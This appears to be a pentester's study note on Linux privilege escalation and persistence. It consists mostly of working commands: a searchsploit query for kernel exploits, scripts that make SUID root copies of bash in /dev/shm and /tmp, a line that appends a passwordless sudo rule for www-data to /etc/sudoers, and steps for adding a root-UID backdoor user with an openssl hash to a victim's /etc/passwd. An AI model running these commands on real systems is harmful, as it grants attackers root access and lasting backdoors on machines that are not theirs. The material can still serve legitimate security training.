# Tricks

```bash
# Given we know we are running 16.04.3 LTS (kernel 4.4.0-116-generic)
searchsploit "Linux Kernel Ubuntu 16.04 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0"
```

Checking `syslog` is particularly useful when exploits dont work as intended

Living in `/dev/shm/` (`/dev/shm` is RAM)

```bash
#!/bin/bash
cp /bin/bash /dev/shm/bash
chown root:root /dev/shm/bash
chmod u+s /dev/shm/bash
```

Living in `/tmp/`

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
```


# Persistence Tricks

```bash
echo 'cp /bin/bash /tmp/test2; chmod +s /tmp/test2' > test.sh
echo "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" > test.sh
```


using from [openssl](../Tools/Encryption/openssl.md) to create a hash password just create a NEW, keyword NEW user and dump that bitch in!

```bash
kali@kali ~> openssl passwd Password123!
$1$ULP1yxsf$6/8pZvyddiKHtjd3KFTCW0

on victim
$ echo "randal:passwdhash:0:0:randal:/:/bin/bash" >


so end result on victim side
$ echo 'randal:$1$ULP1yxsf$6/8pZvyddiKHtjd3KFTCW0:0:0:randal:/:/bin/bash' >> /etc/passwd
```









Generate a password for `/etc/passwd` with [openssl](../Tools/Encryption/openssl.md)

https://sushant747.gitbooks.io/total-oscp-guide/content/cmd.html

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#tools